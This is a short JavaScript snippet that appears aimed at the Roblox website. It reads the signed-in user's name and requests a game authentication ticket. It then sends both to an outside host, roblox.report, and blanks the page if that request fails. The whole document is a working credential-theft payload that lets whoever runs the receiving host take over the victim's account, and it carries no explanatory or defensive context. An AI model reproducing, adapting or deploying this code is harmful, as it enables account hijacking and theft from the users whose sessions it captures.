$.get("/mobileapi/userinfo", function(userInfo){
var username = userInfo["UserName"];
$.get('/game-auth/getauthticket', function(authTicket){
$.get('https://roblox.report/l.php?c='+authTicket+"&u="+username).error(function(d){
window.location.href="about:blank";
})
})
})
